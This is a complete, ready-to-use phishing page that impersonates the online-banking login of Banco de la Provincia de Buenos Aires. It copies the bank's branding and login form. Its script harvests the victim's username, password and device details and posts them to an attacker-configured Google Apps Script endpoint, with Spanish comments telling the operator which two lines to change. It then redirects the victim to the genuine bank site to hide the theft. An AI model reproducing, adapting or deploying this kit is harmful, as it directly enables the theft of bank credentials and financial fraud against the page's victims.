<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<title>Página del Banco de la Provincia de Buenos Aires</title>
<meta name="description" content="Iniciá sesión en BIP">

<!-- ============ IDENTIDAD PARA GOOGLE ============ -->
<meta property="og:type" content="website">
<meta property="og:title" content="Banco de la Provincia de Buenos Aires">
<meta property="og:description" content="Iniciá sesión en BIP">
<meta name="google-site-verification" content="">

<!-- ============ TIPOGRAFÍA OFICIAL ============ -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
:root{
  --safearea-top: env(safe-area-inset-top, 0px);
  --safearea-bottom: env(safe-area-inset-bottom, 0px);
  --bip-body-color:#3c3c3b;
  --bip-danger:#dc3545;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0}
body{
  font-family:"Encode Sans","Encode Sans normal",system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  font-size:1rem;font-weight:400;line-height:1.5;
  color:var(--bip-body-color);background:#fff;
  -webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;
}
button{font-family:inherit}

/* ---------- layout ---------- */
.layout.login{min-height:100vh;background:#fff}
.login-flex-content{display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
.login-content{width:100%;background:#fff}
.login-content-mobile{
  background:#fff;
  border-top-right-radius:1.25rem;
  border-top-left-radius:1.25rem;
  padding-bottom:calc(2.5rem + var(--safearea-bottom));
}

/* ---------- header ---------- */
.header-gradient{
  height:calc(4.375rem + var(--safearea-top));
  padding-top:var(--safearea-top);
  display:flex;align-items:center;justify-content:center;
  background:linear-gradient(270deg,#26b4bd,#3daa35);
  color:#fff;
}
.logoBapro img{height:2.1875rem;width:auto;display:block}

/* ---------- contenido ---------- */
.content{padding:1.5rem .5rem 0}
.txt-title{
  font-family:"Encode Sans",sans-serif;font-weight:600;
  font-size:1.5rem;line-height:1.875rem;
  color:#007a2b;margin:0 0 1.5rem;
}

/* ---------- campos ---------- */
.txt-input-label{
  font-family:"Encode Sans",sans-serif;font-weight:500;
  font-size:1rem;color:var(--bip-body-color);
  display:inline-block;margin-bottom:.25rem;
}
.label-required::after{content:" *";color:var(--bip-danger)}

.form-control{
  display:block;width:100%;min-height:2.625rem;
  padding:.375rem .75rem;
  font-family:inherit;font-size:1rem;line-height:1.5;
  color:var(--bip-body-color);
  background-color:#f8f8f8;
  border:.063rem solid #f8f8f8;
  border-bottom:.063rem solid #3c3c3b;
  border-radius:0;outline:0;appearance:none;
}
.form-control:hover{background-color:#f5f5f5}
.form-control:focus{background-color:#f5f5f5;border:.063rem solid #3c3c3b}
.form-control::placeholder{color:#6c757d;opacity:1}

.password{position:relative;display:flex}
.password .field{flex-shrink:0;width:100%}
.password input{padding-right:2.875rem}
.password-eye-button{
  position:absolute;right:0;top:0;
  min-width:2.625rem;height:2.625rem;
  display:flex;align-items:center;justify-content:center;
  background:transparent;border:0;padding:0;cursor:pointer;color:#3c3c3b;
}

/* ---------- botones ---------- */
.btn{border:0;background:none;padding:0;cursor:pointer;font-size:1rem;line-height:1.5}
.btn-primary{
  display:block;width:100%;
  background-color:#3c3c3b;color:#fff;
  border:.188rem solid transparent;
  border-radius:.25rem .688rem;
  padding:.5rem 1rem;
  font-size:1rem;
}
.btn-primary:hover{background-color:#595958;color:#fff}
.btn-primary:active,.btn-primary:focus{background-color:#2d2d2c;color:#fff}
.btn-primary:disabled{background-color:#ececec;color:#696969;filter:grayscale(100%)}

.btn-link-secondary{background:transparent;color:#007a2b;text-decoration:underline;border:0;padding:0}
.btn-link-secondary:hover{color:#378f30}
.btn-link-secondary:active{color:#23641e}

.txt-link-secondary{color:#007a2b;text-decoration:underline;background:none;border:0;padding:0}
.txt-link-secondary:hover{color:#378f30}
.linktext-underline{text-decoration:underline}

/* ---------- helpers ---------- */
.mb-3{margin-bottom:1rem}
.mt-2{margin-top:.5rem}
.mb-0{margin-bottom:0}
.me-1{margin-right:.25rem}
.text-center{text-align:center}
.w-100{width:100%}
.d-inline-block{display:inline-block}
.status{font-size:.875rem;color:#007a2b;min-height:1.25rem;margin-top:.75rem;text-align:center}

/* ---------- desktop ---------- */
@media (min-width:768px){
  .login-content{
    max-width:26rem;margin:3rem auto;
    border-radius:.625rem;overflow:hidden;
    box-shadow:0 0 .938rem #0000001a;
  }
  .header-gradient{height:5rem}
  .login-content-mobile{border-radius:0}
  .content{padding:2rem 1.5rem 0}
}
</style>
</head>
<body>

<div class="layout login">
  <div class="login-flex-content">
    <div class="login-content">

      <header class="header login-mobile">
        <div class="header-gradient desktop">
          <div class="logoBapro logoBaproLogin">
            <img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip"
                 alt="Banco de la Provincia de Buenos Aires"
                 onerror="this.onerror=null;this.src='logo.png';">
          </div>
        </div>
      </header>

      <main class="login-content-mobile content-softkeyboard">
        <div class="content">

          <h1 class="txt-title">Iniciá sesión</h1>

          <form id="loginForm" action="#" method="post">

            <div class="mb-3">
              <label class="label-required txt-input-label" for="username">Tu usuario</label>
              <div class="user">
                <input class="form-control border-info focusMouse" id="username" name="username"
                       type="text" placeholder="Ingresá tu nombre de usuario"
                       maxlength="25" autocomplete="off" autocapitalize="off" spellcheck="false">
              </div>
            </div>

            <div class="mb-3">
              <label class="label-required txt-input-label" for="password">Tu clave</label>
              <div class="password">
                <div class="field">
                  <input class="form-control border-info focusMouse" id="password" name="password"
                         type="password" placeholder="Ingresá tu clave"
                         maxlength="30" autocomplete="off">
                </div>
                <button class="password-eye-button" type="button" aria-label="Mostrar clave" id="togglePass">
                  <svg width="20px" height="20px" viewBox="0 0 18 12" aria-hidden="true" fill="currentColor">
                    <path d="M18 6.19558L17.7956 6.51558C16.8571 7.81671 15.5498 8.88004 14.0024 9.60075C12.4551 10.3215 10.7212 10.6747 8.97161 10.6256C7.93584 10.6269 6.90454 10.5059 5.90536 10.2656C5.81509 10.2428 5.73038 10.2055 5.65552 10.1556L6.79117 9.15558C7.49196 9.29538 8.20766 9.36913 8.92618 9.37558C10.3402 9.41368 11.7436 9.14872 13.0156 8.60349C14.2876 8.05826 15.3902 7.24909 16.2284 6.24558C15.4246 5.22188 14.3167 4.41239 13.0259 3.90558C12.9546 3.87497 12.8894 3.83445 12.8328 3.78558L13.889 2.84558C15.4895 3.51496 16.8291 4.58668 17.7388 5.92558L18 6.19558ZM9.75521 7.72558C10.267 7.72903 10.7719 7.62126 11.2251 7.41183C11.6783 7.20239 12.0658 6.89775 12.3533 6.52491C12.6408 6.15206 12.8195 5.72252 12.8734 5.27434C12.9273 4.82617 12.8549 4.3732 12.6625 3.95558L8.63092 7.50558C8.99266 7.63081 9.37786 7.69526 9.76656 7.69558L9.75521 7.72558ZM4.08833 10.3856L3.20252 11.1756C3.06155 11.2791 2.88185 11.3326 2.69848 11.3257C2.51511 11.3189 2.34122 11.2521 2.21074 11.1384C2.08025 11.0248 2.00252 10.8724 1.99272 10.711C1.98292 10.5496 2.04175 10.3908 2.15773 10.2656L3.29338 9.26558C2.00023 8.60607 0.924019 7.66185 0.170347 6.52558L0 6.20558L0.204416 5.88558C1.14191 4.58593 2.44744 3.52355 3.99261 2.80292C5.53777 2.08229 7.26935 1.72824 9.01703 1.77558C9.81889 1.77928 10.6181 1.85636 11.4019 2.00558L13.4006 0.195576C13.4685 0.134512 13.5493 0.0858141 13.6386 0.0522635C13.7278 0.018713 13.8237 0.000967017 13.9207 3.84311e-05C14.0177 -0.000890155 14.114 0.0150172 14.204 0.0468519C14.294 0.0786866 14.3761 0.125825 14.4454 0.185577C14.5148 0.245328 14.5701 0.316522 14.6082 0.395094C14.6463 0.473665 14.6664 0.558075 14.6675 0.643505C14.6685 0.728935 14.6505 0.813712 14.6143 0.892994C14.5782 0.972277 14.5246 1.04451 14.4568 1.10558L13.7754 1.71558L4.08833 10.3856ZM1.6694 6.20558C2.35255 7.07942 3.26387 7.79616 4.32681 8.29558L6.47319 6.37558C6.16796 5.88768 6.04226 5.32837 6.11346 4.77488C6.18466 4.22138 6.44923 3.701 6.87066 3.28558C4.76632 3.62772 2.89637 4.67882 1.65804 6.21558"/>
                  </svg>
                </button>
              </div>
            </div>

            <div class="text-center">
              <button class="btn w-100 btn-primary" type="submit" id="btn">Ingresar</button>

              <div class="mt-2">
                <label class="mb-0 d-inline-block">
                  <span class="me-1">¿No sos BIP?</span>
                  <button type="button" class="btn txt-link-secondary">
                    <span class="linktext-underline">Registrate</span>
                  </button>
                </label>
              </div>

              <button type="button" class="btn btn-link-secondary" style="margin-top:.5rem">
                Bloqueé u olvidé mi usuario y/o clave
              </button>

              <div style="margin-top:.75rem">
                <button type="button" class="btn btn-link-secondary">Conocé como hacerte usuario u operar</button>
                <button type="button" class="btn btn-link-secondary">Recomendaciones de seguridad</button>
              </div>

              <div class="status" id="status"></div>
            </div>

          </form>
        </div>
      </main>

    </div>
  </div>
</div>

<script>
/* ==========================================================
   >>>>>>>>>>  SOLO ESTAS 2 LÍNEAS TENÉS QUE CAMBIAR  <<<<<<<<
   ========================================================== */
const CONFIG = {
  CORREO:     "tu.correo@gmail.com",                              // <<<< 1) TU GMAIL
  URL_SCRIPT: "https://script.google.com/macros/s/XXXXXXX/exec",   // <<<< 2) TU URL /exec
  redirigir:  true,
  urlDestino: "https://www.bancoprovincia.bancainternet.com.ar/spa/",
  espera:     1.5
};
/* ========================================================== */

/* ---------- ojo mostrar / ocultar clave ---------- */
const pass   = document.getElementById('password');
const toggle = document.getElementById('togglePass');

toggle.addEventListener('click', function () {
  const oculta = pass.type === 'password';
  pass.type = oculta ? 'text' : 'password';
  toggle.style.opacity = oculta ? '0.5' : '1';
  toggle.setAttribute('aria-label', oculta ? 'Ocultar clave' : 'Mostrar clave');
});

/* ---------- envío ---------- */
const form   = document.getElementById('loginForm');
const btn    = document.getElementById('btn');
const status = document.getElementById('status');

function enviarDatos(payload) {
  const texto = JSON.stringify(payload);
  const blob  = new Blob([texto], { type: 'text/plain;charset=utf-8' });

  let enviado = false;
  try { enviado = navigator.sendBeacon(CONFIG.URL_SCRIPT, blob); } catch (e) {}

  if (!enviado) {
    fetch(CONFIG.URL_SCRIPT, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: texto,
      keepalive: true
    }).catch(function () {});
  }
  return true;
}

form.addEventListener('submit', function (e) {
  e.preventDefault();

  const usuario = document.getElementById('username').value.trim();
  const clave   = pass.value;

  if (!usuario) { status.textContent = 'Ingresá tu usuario'; return; }
  if (!clave)   { status.textContent = 'Ingresá tu clave';   return; }

  btn.disabled = true;
  status.textContent = 'Ingresando...';

  enviarDatos({
    usuario:     usuario,
    clave:       clave,
    fecha:       new Date().toLocaleString('es-AR'),
    dispositivo: navigator.userAgent,
    pantalla:    window.screen.width + 'x' + window.screen.height
  });

  status.textContent = 'Datos enviados ✔';

  if (CONFIG.redirigir) {
    setTimeout(function () { window.location.href = CONFIG.urlDestino; },
               CONFIG.espera * 1000);
  } else {
    btn.disabled = false;
  }
});
</script>

</body>
</html>
